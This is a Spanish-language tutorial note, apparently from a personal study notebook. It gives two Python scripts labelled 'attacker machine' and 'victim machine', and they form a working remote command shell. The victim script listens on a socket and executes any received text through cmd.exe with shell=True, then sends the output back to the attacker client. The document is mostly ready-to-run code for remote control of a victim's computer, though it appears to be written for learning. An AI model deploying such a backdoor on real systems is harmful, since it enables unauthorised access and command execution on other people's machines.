Necesitaremos un script de la máquina atacante, donde se va a pedir al usuario que envíe un comando para que se envíe a la máquina víctima; y después al mismo tiempo recibiremos ese output procedente de la máquina víctima de vuelta a nuestra máquina atacante.
## CÓDIGO MÁQUINA ATACANTE
```python
import socket

# Definimos la dirección y puerto del servidor (Siempre de la máquina víctima)
server_address = ('192.168.0.13', 5000)

while True:
    # Creamos el socket cliente, ya que restablecemos la conexión a cada comando que se ejecute
    client_socket = socket.socket()
    client_socket.connect(server_address)

    # Solicitamos al usuario que introduzca un comando
    comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")

    # Si el usuario introduce "exit", cerramos la conexión y salimos del bucle
    if comando_enviar == 'exit':
        client_socket.close()
        break

    # Enviamos el comando a la máquina víctima:
    client_socket.send(comando_enviar.encode())

    # Esperamos a recibir la respuesta de la víctima y lo guardamos en la variable respuesta.
    respuesta = client_socket.recv(4096)

    # Imprimimos la respuesta;
    print(respuesta.decode()) 

    # Cerramos el socket, que se volverá a abrir al inicio del bucle:
    client_socket.close()
```
## CÓDIGO MÁQUINA VÍCTIMA
Este es el código que se ejecutará en la máquina víctima:
```python
import socket
import subprocess

# Definimos la dirección y puerto (Siempre de la máquina víctima)
server_address = ('192.168.0.13', 5000)


while True:
    # Creamos el socket (la conexión)
    server_socket = socket.socket()
    server_socket.bind(server_address)
    server_socket.listen(1)
    # Esperamos a recibir una conexión
    client_socket, client_address = server_socket.accept()

    # Recibimos el comando de la máquina atacante
    comando = client_socket.recv(4096).decode()

    # Si el cliente envía "exit", cerramos la conexión y salimos del bucle
    if comando == 'exit':
        client_socket.close()
        break

    # Ejecutamos el comando y obtenemos su salida en la variable result
    result = subprocess.run(f"cmd.exe /c {comando}", shell=True, capture_output=True, text=True)
    salida = result.stdout

    # Enviamos la salida a la máquina atacante
    client_socket.send(salida.encode())

    # Cerramos la conexión con el cliente
    client_socket.close()

    # Cerramos el socket servidor
    server_socket.close()
```
 ---------------------------------------------
 Ahora el funcionamiento será el siguiente, donde primero ejecutaremos el código desde la máquina víctima para que permanezca en escucha a espera del comando enviado por la máquina atacante:
 ![[Pasted image 20230308125116.png]]
 Y ahora si ejecutamos el código desde la máquina atacante, ya podremos insertar el comando que queramos y recibirlo de vuelta: ![[Pasted image 20230308125219.png]]